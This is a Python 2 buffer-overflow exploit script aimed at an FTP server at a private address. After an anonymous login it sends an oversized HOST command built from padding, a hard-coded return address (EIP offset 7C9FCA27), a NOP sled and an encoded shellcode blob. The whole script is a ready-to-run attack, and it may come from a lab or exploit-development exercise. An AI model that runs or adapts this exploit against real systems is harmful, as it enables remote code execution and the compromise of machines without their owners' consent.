#!/usr/bin/python



import socket
import os
import sys

#creat an array of buffers, while incrementing them.

shell = ("\xbf\x52\x30\xc4\xb9\xd9\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x31\x83\xc5\x04\x31\x7d\x0f\x03\x7d\x5d\xd2\x31\x45\x89\x90"
"\xba\xb6\x49\xf5\x33\x53\x78\x35\x27\x17\x2a\x85\x23\x75\xc6"
"\x6e\x61\x6e\x5d\x02\xae\x81\xd6\xa9\x88\xac\xe7\x82\xe9\xaf"
"\x6b\xd9\x3d\x10\x52\x12\x30\x51\x93\x4f\xb9\x03\x4c\x1b\x6c"
"\xb4\xf9\x51\xad\x3f\xb1\x74\xb5\xdc\x01\x76\x94\x72\x1a\x21"
"\x36\x74\xcf\x59\x7f\x6e\x0c\x67\xc9\x05\xe6\x13\xc8\xcf\x37"
"\xdb\x67\x2e\xf8\x2e\x79\x76\x3e\xd1\x0c\x8e\x3d\x6c\x17\x55"
"\x3c\xaa\x92\x4e\xe6\x39\x04\xab\x17\xed\xd3\x38\x1b\x5a\x97"
"\x67\x3f\x5d\x74\x1c\x3b\xd6\x7b\xf3\xca\xac\x5f\xd7\x97\x77"
"\xc1\x4e\x7d\xd9\xfe\x91\xde\x86\x5a\xd9\xf2\xd3\xd6\x80\x98"
"\x22\x64\xbf\xee\x25\x76\xc0\x5e\x4e\x47\x4b\x31\x09\x58\x9e"
"\x76\xf5\xba\x0b\x82\x9e\x62\xde\x2f\xc3\x94\x34\x73\xfa\x16"
"\xbd\x0b\xf9\x07\xb4\x0e\x45\x80\x24\x62\xd6\x65\x4b\xd1\xd7"
"\xaf\x28\xb4\x4b\x33\x81\x53\xec\xd6\xdd")

buffer = "A" * 246 + "\x27\xca\x9f\x7c" + "\x90" * 20 +  shell + "C" * (700-len(shell))

#EIP Offset = 7C9FCA27

print "[+] Sending Buffer."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.0.156',21))
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('HOST ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close()
print "[+] Exploit Completed."
